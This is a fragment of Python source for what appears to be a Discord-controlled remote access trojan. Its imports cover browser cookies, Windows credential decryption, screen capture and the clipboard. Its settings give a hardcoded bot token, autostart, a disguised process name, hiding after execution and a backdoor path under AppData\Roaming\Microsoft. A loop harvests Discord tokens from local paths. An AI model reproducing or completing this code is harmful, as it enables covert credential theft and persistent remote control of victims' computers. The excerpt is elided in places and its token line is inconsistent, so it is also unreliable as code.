import pyautogui, sqlite3, cv2, time, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, shutil
...
token = "MTM5NDY4MTc5MjMwMDMyMjk3OA.GlXtLp.3UQgqfrqTX2E91hidVnTxqBgv-p9xQHNei3Lyc"
guild_id = "1394680975438385182"
autostart = True
antivm = False

process_name = "usermode front drivr"
if not process_name.endswith(".exe"):
    process_name = process_name + ".exe"

hide_after_exec = True

backdoor_location = "\\AppData\\Roaming\\Microsoft\\"
...
annc_channel_id = "1394734605432520775"
            ...
            for path_grab in PATHS:
                if os.path.exists(path_grab):
                    for token in gettokens(path_grab):
                        all_tokens.append(f"`{path_grab}` - **MTM5NDY4MTc5MjMwMDMyMjk3OA.GlXtLp.3UQgqfrqTX2E91hidVnTxqBgv-p9xQHNei3Lyc**")
